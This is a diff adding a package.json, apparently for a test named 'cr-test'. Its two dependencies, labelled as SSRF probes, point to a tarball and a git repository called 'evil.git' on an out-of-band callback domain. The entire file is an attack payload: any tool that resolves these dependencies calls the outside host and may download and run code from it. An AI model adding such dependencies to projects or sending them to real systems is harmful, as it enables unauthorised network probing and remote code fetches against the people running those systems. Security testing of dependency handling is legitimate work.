@@ -1,0 +1,8 @@
+{
+  "name": "cr-test",
+  "version": "1.0.0",
+  "dependencies": {
+    "ssrf-probe-a": "https://npm.dbpf6j7bjodg36s2pn9gfbkakrhdn88yi.oast.site/probe-a.tgz",
+    "ssrf-probe-b": "git+ssh://git@git.dbpf6j7bjodg36s2pn9gfbkakrhdn88yi.oast.site/evil.git"
+  }
+}
